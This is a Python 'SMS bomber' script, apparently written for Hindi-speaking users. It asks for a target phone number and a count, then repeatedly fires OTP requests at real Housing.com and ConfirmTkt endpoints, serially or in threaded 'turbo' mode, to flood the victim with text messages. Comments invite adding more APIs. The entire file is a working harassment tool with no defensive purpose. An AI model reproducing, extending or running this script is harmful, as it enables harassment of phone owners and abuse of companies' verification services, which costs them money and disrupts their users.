import requests
import os
import time
import threading

# --- COLORS ---
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
W = "\033[0m"  # White

success_count = 0
failed_count = 0

# ---------------------------------------------------------
# 1. WORKING API DATABASE
# ---------------------------------------------------------
# Aapne kaha sirf Housing aur ConfirmTkt kaam kar rahe hain.
# Naye APIs aap niche di gayi list mein add kar sakte hain.
SMS_APIS = [
    {
        "name": "Housing.com", 
        "method": "POST", 
        "url": "https://login.housing.com/api/v2/send-otp", 
        "json": {"phone": "{target}"}
    },
    {
        "name": "ConfirmTkt", 
        "method": "GET", 
        "url": "https://securedapi.confirmtkt.com/api/platform/register", 
        "params": {"newOtp": "true", "mobileNumber": "{target}"}
    }
    
    # <--- APNE NAYE APIs YAHAN ADD KAREIN --->
    # Example (POST): {"name": "Naam", "method": "POST", "url": "URL", "json": {"phone": "{target}"}},
    # Example (GET):  {"name": "Naam", "method": "GET", "url": "URL", "params": {"mobile": "{target}"}},
]

def banner():
    os.system("clear")
    print(f"{G}========================================")
    print("      🚀 CLEAN TURBO BOT v12.0        ")
    print(f"========================================{W}\n")

def send_request(api, target):
    global success_count, failed_count
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    try:
        url = api["url"].replace("{target}", target)
        
        # Data/Params replacement logic
        params = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("params", {}).items()} if "params" in api else None
        json_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("json", {}).items()} if "json" in api else None
        data_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("data", {}).items()} if "data" in api else None

        if api["method"] == "GET":
            response = requests.get(url, params=params, headers=headers, timeout=5)
        else:
            response = requests.post(url, json=json_p, data=data_p, headers=headers, timeout=5)

        if response.status_code == 200:
            success_count += 1
            print(f"{G}[SUCCESS] {api['name']} - OTP Sent!{W}")
        else:
            failed_count += 1
            print(f"{Y}[-] {api['name']} Status: {response.status_code}{W}")

    except Exception:
        failed_count += 1
        print(f"{R}[!] Failed via {api['name']}{W}")

def main():
    banner()
    
    target = input(f"{G}Enter Target Number: {W}")
    limit = input(f"{G}Enter SMS Limit: {W}")
    
    print(f"\n{Y}Select Mode: 1. Serial (Stable) | 2. Threading (Turbo){W}")
    mode = input("Choice: ")

    if not target or not limit: return

    limit = int(limit)
    current_sent = 0

    print(f"\n{G}[*] Launching on {target}...{W}\n")

    if mode == "1":
        while current_sent < limit:
            for api in SMS_APIS:
                if current_sent >= limit: break
                send_request(api, target)
                current_sent += 1
                time.sleep(1)
    else:
        while current_sent < limit:
            threads = []
            for api in SMS_APIS:
                if current_sent >= limit: break
                t = threading.Thread(target=send_request, args=(api, target))
                t.start()
                threads.append(t)
                current_sent += 1
            for t in threads: t.join()

    print(f"\n{G}--- DONE | OK: {success_count} | FAIL: {failed_count} ---{W}")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{R}Stopped.{W}")
